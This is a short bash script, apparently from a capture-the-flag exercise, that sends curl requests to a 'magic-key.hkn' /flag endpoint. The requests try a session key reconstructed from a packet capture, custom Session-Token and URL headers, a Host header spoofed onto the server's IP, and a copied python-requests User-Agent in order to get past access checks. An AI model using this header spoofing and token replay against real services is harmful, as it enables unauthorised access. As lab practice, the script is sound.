#!/bin/bash
# Two new angles:
# 1) Use the RECONSTRUCTED fragment-chain key as PLAINTEXT (not base64) Session-Token,
#    combined with the "URL" header (not "URL-Maybe") as seen in the original pcap.
# 2) Force Host: secret-server.hkn against magic-key.hkn's IP (vhost routing) since
#    ALL successful-looking requests in the original pcap used Host: secret-server.hkn.
MAGIC_KEY_IP="77.76.10.55"
KEY='C%{6bSUAs52sI@$K8Ouk0'

echo "### A1: plaintext key as Session-Token + URL:/flag, against magic-key.hkn/flag ###"
curl -s --connect-timeout 3 --max-time 5 -i "http://magic-key.hkn/flag" \
    -H "Session-Token: $KEY" \
    -H "URL: /flag"
echo ""; echo "---"

echo "### A2: plaintext key as Session-Token + URL-Maybe:/flag, against magic-key.hkn/flag ###"
curl -s --connect-timeout 3 --max-time 5 -i "http://magic-key.hkn/flag" \
    -H "Session-Token: $KEY" \
    -H "URL-Maybe: /flag"
echo ""; echo "---"

echo "### B1: Host: secret-server.hkn spoofed onto magic-key.hkn's IP, root ###"
curl -s --connect-timeout 3 --max-time 5 -i "http://$MAGIC_KEY_IP/flag" \
    -H "Host: secret-server.hkn" \
    -H "Session-Token: good-session-token" \
    -H "URL: /flag"
echo ""; echo "---"

echo "### B2: Host: secret-server.hkn spoofed onto magic-key.hkn's IP, plaintext reconstructed key ###"
curl -s --connect-timeout 3 --max-time 5 -i "http://$MAGIC_KEY_IP/flag" \
    -H "Host: secret-server.hkn" \
    -H "Session-Token: $KEY" \
    -H "URL: /flag"
echo ""; echo "---"

echo "### C1: plain 'good-session-token' value but WITHOUT URL header, just Session-Token, against /flag ###"
curl -s --connect-timeout 3 --max-time 5 -i "http://magic-key.hkn/flag" \
    -H "Session-Token: good-session-token"
echo ""; echo "---"

echo "### C2: python-requests User-Agent (matches the pcap's successful request UA) + Session-Token + URL ###"
curl -s --connect-timeout 3 --max-time 5 -i "http://magic-key.hkn/flag" \
    -A "python-requests/2.31.0" \
    -H "Session-Token: good-session-token" \
    -H "URL: /flag"
echo ""; echo "---"
